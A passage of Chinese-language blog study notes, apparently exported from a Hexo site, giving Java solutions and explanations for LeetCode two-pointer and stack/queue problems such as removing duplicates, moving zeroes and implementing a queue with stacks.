<h2 id="思路：双指针"><a href="#思路：双指针" class="headerlink" title="思路：双指针"></a>思路：双指针</h2><p>快慢指针</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">removeElement</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="type">int</span>  <span class="variable">slowPtr</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">fastPtr</span> <span class="operator">=</span> <span class="number">0</span> ; fastPtr &lt; nums.length;fastPtr++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[fastPtr] != val)&#123;</span><br><span class="line">                nums[slowPtr] = nums[fastPtr];</span><br><span class="line">                slowPtr++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slowPtr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O(n)</li>
<li>空间复杂度：O(1)</li>
</ul>
<span id="more"></span>

<h1 id="26-删除有序数组中的重复项"><a href="#26-删除有序数组中的重复项" class="headerlink" title="26. 删除有序数组中的重复项"></a><a href="https://leetcode.cn/problems/remove-duplicates-from-sorted-array/">26. 删除有序数组中的重复项</a></h1><blockquote>
<p>给你一个 <strong>升序排列</strong> 的数组 <code>nums</code> ，请你**<a href="http://baike.baidu.com/item/%E5%8E%9F%E5%9C%B0%E7%AE%97%E6%B3%95"> 原地</a>** 删除重复出现的元素，使每个元素 <strong>只出现一次</strong> ，返回删除后数组的新长度。元素的 <strong>相对顺序</strong> 应该保持 <strong>一致</strong> </p>
<p>示例 1：</p>
<p>输入：nums &#x3D; [1,1,2]<br>输出：2, nums &#x3D; [1,2,_]<br>解释：函数应该返回新的长度 2 ，并且原数组 nums 的前两个元素被修改为 1, 2 。不需要考虑数组中超出新长度后面的元素。</p>
</blockquote>
<h2 id="思路1：哈希-双指针"><a href="#思路1：哈希-双指针" class="headerlink" title="思路1：哈希+双指针"></a>思路1：哈希+双指针</h2><p>双指针的思想和前面一题一样，但这里我个人采用哈希来判断是否出现重复，但好像时间复杂度比较高</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">removeDuplicates</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">slowPtr</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">fastPtr</span> <span class="operator">=</span> <span class="number">0</span> ; fastPtr &lt; nums.length ; fastPtr++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!map.containsKey(nums[fastPtr]))&#123;</span><br><span class="line">                map.put(nums[fastPtr],fastPtr);</span><br><span class="line">                nums[slowPtr] = nums[fastPtr];</span><br><span class="line">                slowPtr++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slowPtr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路2：直接双指针"><a href="#思路2：直接双指针" class="headerlink" title="思路2：直接双指针"></a>思路2：直接双指针</h2><p>发下前面自己想的有点简单，题目中升序排列这个条件没有用到，所以不用担心可能出现[1,2,3,1,2,3]这种情况，所以根本不用哈希</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">removeDuplicates</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">fastPtr</span> <span class="operator">=</span> <span class="number">1</span> , slowPtr = <span class="number">1</span> ,ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(fastPtr &lt; nums.length )&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[fastPtr] != nums[fastPtr-<span class="number">1</span>])&#123;</span><br><span class="line">                nums[slowPtr] = nums[fastPtr];</span><br><span class="line">                slowPtr++;</span><br><span class="line">            &#125;</span><br><span class="line">            fastPtr++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slowPtr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="283-移动零"><a href="#283-移动零" class="headerlink" title="283. 移动零"></a><a href="https://leetcode.cn/problems/move-zeroes/">283. 移动零</a></h1><blockquote>
<p>给定一个数组 nums，编写一个函数将所有 0 移动到数组的末尾，同时保持非零元素的相对顺序。</p>
<p>请注意 ，必须在不复制数组的情况下原地对数组进行操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">示例 1:</span><br><span class="line"></span><br><span class="line">输入: nums = [0,1,0,3,12]</span><br><span class="line">输出: [1,3,12,0,0]</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路1：双指针-两次遍历"><a href="#思路1：双指针-两次遍历" class="headerlink" title="思路1：双指针(两次遍历)"></a>思路1：双指针(两次遍历)</h2><p>先将所有非0的数填充到数组前面，同时更新slowPtr，再将从slowPtr 到len-1的部分全部填充为0</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">moveZeroes</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">slowPtr</span> <span class="operator">=</span> <span class="number">0</span> , len = nums.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">fastPtr</span> <span class="operator">=</span> <span class="number">0</span> ; fastPtr &lt; len ; fastPtr++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[fastPtr] != <span class="number">0</span>)&#123;</span><br><span class="line">                nums[slowPtr] = nums[fastPtr];</span><br><span class="line">                slowPtr++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(;slowPtr &lt; len ; slowPtr++)&#123;</span><br><span class="line">            nums[slowPtr] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：1 ms, 在所有 Java 提交中击败了100.00%的用户</li>
<li>内存消耗：42.8 MB, 在所有 Java 提交中击败了45.63%的用户</li>
<li>通过测试用例：74 &#x2F; 74</li>
</ul>
<h2 id="思路2：双指针（一次遍历）"><a href="#思路2：双指针（一次遍历）" class="headerlink" title="思路2：双指针（一次遍历）"></a>思路2：双指针（一次遍历）</h2><p><img src="https://picgooo.oss-cn-hangzhou.aliyuncs.com/img/36d1ac5d689101cbf9947465e94753c626eab7fcb736ae2175f5d87ebc85fdf0-283_2.gif" alt="283_2.gif"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">moveZeroes</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="literal">null</span>) <span class="keyword">return</span> ;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span> ;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt;nums.length ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] != <span class="number">0</span> )&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[i];</span><br><span class="line">                nums[i] = nums[j];</span><br><span class="line">                nums[j++] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：1 ms, 在所有 Java 提交中击败了100.00%的用户,O(n)</li>
<li>内存消耗：42.4 MB, 在所有 Java 提交中击败了93.05%的用户，O(1)</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>双指针</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode——栈与队列</title>
    <url>/2022/05/12/21-leetcode%E2%80%94%E2%80%94%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下leetcode栈与队列部分题目的刷题笔记，顺序参考代码随想录中，但不仅限于这些，可以扩展记录。</p>
<h1 id="笔记记录"><a href="#笔记记录" class="headerlink" title="笔记记录"></a>笔记记录</h1><h2 id="1、LinkedList"><a href="#1、LinkedList" class="headerlink" title="1、LinkedList"></a>1、LinkedList</h2><p>Java里的LinkedList可以同时作为堆栈和队列使用，因此在使用的时候总是会弄混他们的方法，这里简单总结一下作为不同数据结构时的用法：</p>
<h3 id="作为队列："><a href="#作为队列：" class="headerlink" title="作为队列："></a>作为队列：</h3><h4 id="（1）声明"><a href="#（1）声明" class="headerlink" title="（1）声明"></a>（1）声明</h4><p>任意两种方法：</p>
<ul>
<li>一是直接声明LinkedList：<br> <code>LinkedList&lt;T&gt; q = new LinkedList&lt;T&gt;();</code></li>
<li>或者使用java.util.Queue接口，其底层关联到一个LinkedList实例。<br> <strong><code>Queue&lt;T&gt; q = new LinkedList&lt;T&gt;();</code></strong><br> 由于只暴露部分基于队列实现的接口，所以可以提供安全的队列实现。</li>
</ul>
<h4 id="（2）入队"><a href="#（2）入队" class="headerlink" title="（2）入队"></a>（2）入队</h4><p><strong><code>void offer(T v)</code></strong></p>
<h4 id="（3）出队"><a href="#（3）出队" class="headerlink" title="（3）出队"></a>（3）出队</h4><ul>
<li><strong><code>T poll()</code></strong>, 如果队列为空，则返回null</li>
<li><code>T remove()</code>,  如果队列为空，则抛出异常</li>
</ul>
<h4 id="（4）偷看"><a href="#（4）偷看" class="headerlink" title="（4）偷看"></a>（4）偷看</h4><p>看看队首元素不移除它。</p>
<ul>
<li><strong><code>T peek()</code></strong>, 如果队列为空，则返回null</li>
<li><code>T element()</code>,  如果队列为空，则抛出异常</li>
</ul>
<h4 id="（5）是否为空"><a href="#（5）是否为空" class="headerlink" title="（5）是否为空"></a>（5）是否为空</h4><ul>
<li><code>boolean isEmpty()</code>, 空返回true，否则返回false</li>
</ul>
<span id="more"></span>

<h3 id="作为堆栈："><a href="#作为堆栈：" class="headerlink" title="作为堆栈："></a>作为堆栈：</h3><h4 id="（1）声明-1"><a href="#（1）声明-1" class="headerlink" title="（1）声明"></a>（1）声明</h4><p>任意两种方法：</p>
<ul>
<li>一是直接声明LinkedList：<br> <code>LinkedList&lt;T&gt; stack = new LinkedList&lt;T&gt;();</code></li>
<li>请注意，LinkedList实现的堆栈名称是Deque:<br> <strong><code>Deque&lt;T&gt; stack = new LinkedList&lt;T&gt;();</code></strong><br> 由于只暴露部分基于堆栈实现的接口，所以可以提供安全的队列实现。</li>
</ul>
<h4 id="（2）入栈"><a href="#（2）入栈" class="headerlink" title="（2）入栈"></a>（2）入栈</h4><p><strong><code>void addFirst(T v) void push(T v)</code></strong></p>
<h4 id="（3）出栈"><a href="#（3）出栈" class="headerlink" title="（3）出栈"></a>（3）出栈</h4><ul>
<li><strong><code>T pop()</code></strong></li>
<li><code>T poll()</code></li>
</ul>
<h4 id="（4）偷看-1"><a href="#（4）偷看-1" class="headerlink" title="（4）偷看"></a>（4）偷看</h4><p>看看队首元素不移除它。</p>
<ul>
<li><strong><code>T peek()</code></strong>, 如果队列为空，则返回null</li>
<li><code>T element()</code>, 如果队列为空，则抛出异常</li>
</ul>
<h4 id="（5）是否为空-1"><a href="#（5）是否为空-1" class="headerlink" title="（5）是否为空"></a>（5）是否为空</h4><ul>
<li><code>boolean isEmpty()</code>, 空返回true，否则返回false</li>
</ul>
<p><a href="https://www.jianshu.com/p/e05b746398e7">【Java】LinkedList 作为队列和堆栈的总结 - 简书 (jianshu.com)</a></p>
<h1 id="232-用栈实现队列"><a href="#232-用栈实现队列" class="headerlink" title="232. 用栈实现队列"></a><a href="https://leetcode.cn/problems/implement-queue-using-stacks/">232. 用栈实现队列</a></h1><blockquote>
<p>请你仅使用两个栈实现先入先出队列。队列应当支持一般队列支持的所有操作（push、pop、peek、empty）：</p>
<p>实现 MyQueue 类：</p>
<p>void push(int x) 将元素 x 推到队列的末尾<br>int pop() 从队列的开头移除并返回元素<br>int peek() 返回队列开头的元素<br>boolean empty() 如果队列为空，返回 true ；否则，返回 false<br>说明：</p>
<p>你 只能 使用标准的栈操作 —— 也就是只有 push to top, peek&#x2F;pop from top, size, 和 is empty 操作是合法的。<br>你所使用的语言也许不支持栈。你可以使用 list 或者 deque（双端队列）来模拟一个栈，只要是标准的栈操作即可。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">[&quot;MyQueue&quot;, &quot;push&quot;, &quot;push&quot;, &quot;peek&quot;, &quot;pop&quot;, &quot;empty&quot;]</span><br><span class="line">[[], [1], [2], [], [], []]</span><br><span class="line">输出：</span><br><span class="line">[null, null, null, 1, 1, false]</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">MyQueue myQueue = new MyQueue();</span><br><span class="line">myQueue.push(1); // queue is: [1]</span><br><span class="line">myQueue.push(2); // queue is: [1, 2] (leftmost is front of the queue)</span><br><span class="line">myQueue.peek(); // return 1</span><br><span class="line">myQueue.pop(); // return 1, queue is [2]</span><br><span class="line">myQueue.empty(); // return false</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：直接模拟"><a href="#思路：直接模拟" class="headerlink" title="思路：直接模拟"></a>思路：直接模拟</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> &#123;</span><br><span class="line">    Stack&lt;Integer&gt; stackIn;</span><br><span class="line">    Stack&lt;Integer&gt; stackOut;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyQueue</span><span class="params">()</span> &#123;</span><br><span class="line">        stackIn = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stackOut = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        stackIn.push(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        in2out();</span><br><span class="line">        <span class="keyword">return</span> stackOut.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">peek</span><span class="params">()</span> &#123;</span><br><span class="line">        in2out();</span><br><span class="line">        <span class="keyword">return</span> stackOut.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">empty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> stackIn.isEmpty() &amp;&amp; stackOut.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">in2out</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!stackOut.isEmpty()) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">while</span>(!stackIn.isEmpty())&#123;</span><br><span class="line">            stackOut.push(stackIn.pop());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyQueue object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyQueue obj = new MyQueue();</span></span><br><span class="line"><span class="comment"> * obj.push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj.peek();</span></span><br><span class="line"><span class="comment"> * boolean param_4 = obj.empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h1 id="225-用队列实现栈"><a href="#225-用队列实现栈" class="headerlink" title="225. 用队列实现栈"></a><a href="https://leetcode.cn/problems/implement-stack-using-queues/">225. 用队列实现栈</a></h1><blockquote>
<p>请你仅使用两个队列实现一个后入先出（LIFO）的栈，并支持普通栈的全部四种操作（push、top、pop 和 empty）。</p>
<p>实现 MyStack 类：</p>
<p>void push(int x) 将元素 x 压入栈顶。<br>int pop() 移除并返回栈顶元素。<br>int top() 返回栈顶元素。<br>boolean empty() 如果栈是空的，返回 true ；否则，返回 false 。</p>
<p>注意：</p>
<p>你只能使用队列的基本操作 —— 也就是 push to back、peek&#x2F;pop from front、size 和 is empty 这些操作。<br>你所使用的语言也许不支持队列。 你可以使用 list （列表）或者 deque（双端队列）来模拟一个队列 , 只要是标准的队列操作即可。</p>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">[&quot;MyStack&quot;, &quot;push&quot;, &quot;push&quot;, &quot;top&quot;, &quot;pop&quot;, &quot;empty&quot;]</span><br><span class="line">[[], [1], [2], [], [], []]</span><br><span class="line">输出：</span><br><span class="line">[null, null, null, 2, 2, false]</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">MyStack myStack = new MyStack();</span><br><span class="line">myStack.push(1);</span><br><span class="line">myStack.push(2);</span><br><span class="line">myStack.top(); // 返回 2</span><br><span class="line">myStack.pop(); // 返回 2</span><br><span class="line">myStack.empty(); // 返回 False</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：直接模拟-1"><a href="#思路：直接模拟-1" class="headerlink" title="思路：直接模拟"></a>思路：直接模拟</h2><p>其实这道题目就是用一个队列就够了。</p>
<p><strong>一个队列在模拟栈弹出元素的时候只要将队列头部的元素（除了最后一个元素外） 重新添加到队列尾部，此时在去弹出元素就是栈的顺序了。</strong></p>
<p>但如果使用两个队列的话，如下代码可以看出：queue2只是用来辅助队列的，并不是和前面一题一样，区别在于：</p>
<p>用栈实现队列：要额外注意pop操作</p>
<p>用队列实现栈：要额外注意push操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyStack</span> &#123;</span><br><span class="line">    Queue&lt;Integer&gt; queue1;</span><br><span class="line">    Queue&lt;Integer&gt; queue2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyStack</span><span class="params">()</span> &#123;</span><br><span class="line">        queue1 = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue2 = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        queue2.offer(x);<span class="comment">//先放在辅助队列中</span></span><br><span class="line">        <span class="keyword">while</span>(!queue1.isEmpty())&#123;</span><br><span class="line">            queue2.offer(queue1.poll());</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;Integer&gt; queueTemp;</span><br><span class="line">        queueTemp = queue1;</span><br><span class="line">        queue1 = queue2;</span><br><span class="line">        queue2 = queueTemp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> queue1.poll();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">top</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> queue1.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">empty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> queue1.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyStack obj = new MyStack();</span></span><br><span class="line"><span class="comment"> * obj.push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj.top();</span></span><br><span class="line"><span class="comment"> * boolean param_4 = obj.empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h1 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20. 有效的括号"></a><a href="https://leetcode.cn/problems/valid-parentheses/">20. 有效的括号</a></h1><blockquote>
<p>给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串 s ，判断字符串是否有效。</p>
<p>有效字符串需满足：</p>
<p>左括号必须用相同类型的右括号闭合。<br>左括号必须以正确的顺序闭合。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;()&quot;</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：栈"><a href="#思路：栈" class="headerlink" title="思路：栈"></a>思路：栈</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        Stack&lt;Character&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">temp</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span>(temp==<span class="string">&#x27;(&#x27;</span>||temp==<span class="string">&#x27;&#123;&#x27;</span>||temp==<span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">                stack.push(temp);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(temp==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!stack.isEmpty()&amp;&amp;stack.peek()==<span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                        stack.pop();</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(temp==<span class="string">&#x27;&#125;&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!stack.isEmpty()&amp;&amp;stack.peek()==<span class="string">&#x27;&#123;&#x27;</span>)&#123;</span><br><span class="line">                        stack.pop();</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(temp==<span class="string">&#x27;]&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!stack.isEmpty()&amp;&amp;stack.peek()==<span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">                        stack.pop();</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：1 ms, 在所有 Java 提交中击败了98.89%的用户</li>
<li>内存消耗：39.1 MB, 在所有 Java 提交中击败了94.10%的用户</li>
</ul>
<h1 id="1047-删除字符串中的所有相邻重复项"><a href="#1047-删除字符串中的所有相邻重复项" class="headerlink" title="1047. 删除字符串中的所有相邻重复项"></a><a href="https://leetcode.cn/problems/remove-all-adjacent-duplicates-in-string/">1047. 删除字符串中的所有相邻重复项</a></h1><blockquote>
<p>给出由小写字母组成的字符串 S，重复项删除操作会选择两个相邻且相同的字母，并删除它们。</p>
<p>在 S 上反复执行重复项删除操作，直到无法继续删除。</p>
<p>在完成所有重复项删除操作后返回最终的字符串。答案保证唯一。</p>
<p>示例：</p>
<p>输入：”abbaca”<br>输出：”ca”<br>解释：<br>例如，在 “abbaca” 中，我们可以删除 “bb” 由于两字母相邻且相同，这是此时唯一可以执行删除操作的重复项。之后我们得到字符串 “aaca”，其中又只有 “aa” 可以执行重复项删除操作，所以最后的字符串为 “ca”</p>
</blockquote>
<h2 id="思路：模拟栈"><a href="#思路：模拟栈" class="headerlink" title="思路：模拟栈"></a>思路：模拟栈</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">removeDuplicates</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">stack</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">top</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; s.length(); i++)&#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">temp</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span>(top&gt;=<span class="number">0</span> &amp;&amp;stack.charAt(top) == temp)&#123;</span><br><span class="line">                stack.deleteCharAt(top);</span><br><span class="line">                --top;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                stack.append(temp);</span><br><span class="line">                ++top;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="150-逆波兰表达式求值"><a href="#150-逆波兰表达式求值" class="headerlink" title="150. 逆波兰表达式求值"></a><a href="https://leetcode.cn/problems/evaluate-reverse-polish-notation/">150. 逆波兰表达式求值</a></h1><blockquote>
<p>根据 逆波兰表示法，求表达式的值。</p>
<p>有效的算符包括 +、-、*、&#x2F; 。每个运算对象可以是整数，也可以是另一个逆波兰表达式。</p>
<p>注意 两个整数之间的除法只保留整数部分。</p>
<p>可以保证给定的逆波兰表达式总是有效的。换句话说，表达式总会得出有效数值且不存在除数为 0 的情况。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">示例 1：</span><br><span class="line"></span><br><span class="line">输入：tokens = [&quot;2&quot;,&quot;1&quot;,&quot;+&quot;,&quot;3&quot;,&quot;*&quot;]</span><br><span class="line">输出：9</span><br><span class="line">解释：该算式转化为常见的中缀算术表达式为：((2 + 1) * 3) = 9</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：模拟栈-1"><a href="#思路：模拟栈-1" class="headerlink" title="思路：模拟栈"></a>思路：模拟栈</h2><p><img src="https://code-thinking.cdn.bcebos.com/gifs/150.%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC.gif" alt="https://code-thinking.cdn.bcebos.com/gifs/150.%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC.gif"></p>
